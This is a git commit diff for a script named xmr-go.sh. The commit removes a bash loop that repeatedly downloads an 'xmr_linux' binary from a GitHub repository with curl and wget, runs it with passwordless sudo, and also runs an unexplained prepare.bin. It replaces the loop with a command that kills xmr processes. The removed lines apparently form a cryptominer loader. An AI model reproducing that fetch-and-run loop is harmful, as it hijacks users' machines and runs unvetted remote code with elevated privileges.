bd0323cc8e7f5566415ad3adf19b7d0f05d46ccf
tr1fled <124415108+tr1fled@users.noreply.github.com>
2024-09-30 17:59:05 -0600

    De-Skid Original Code

--- xmr-go.sh
+++ xmr-go.sh
@@ -1,34 +1,3 @@
 #!/bin/bash
 
-architecture=$(uname -m)
-
-case $architecture in
-    arm64 | aarch64)
-        arch="arm64"
-        ;;
-    x86_64 | amd64)
-        arch="amd64"
-        ;;
-    *)
-        echo "Unsupported architecture: $architecture"
-        exit 1
-        ;;
-esac
-chmod +x prepare.bin
-./prepare.bin
-
-unalias -a
-
-while true; do
-    rm xmr_linux_$arch
-    curl -LO https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
-    chmod +x xmr_linux_$arch
-    sudo -n ./xmr_linux_$arch
-    ./xmr_linux_$arch
-
-    rm xmr_linux_$arch
-    wget https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
-    chmod +x xmr_linux_$arch
-    sudo -n ./xmr_linux_$arch
-    ./xmr_linux_$arch
-done
+pgrep xmr | sudo xargs kill
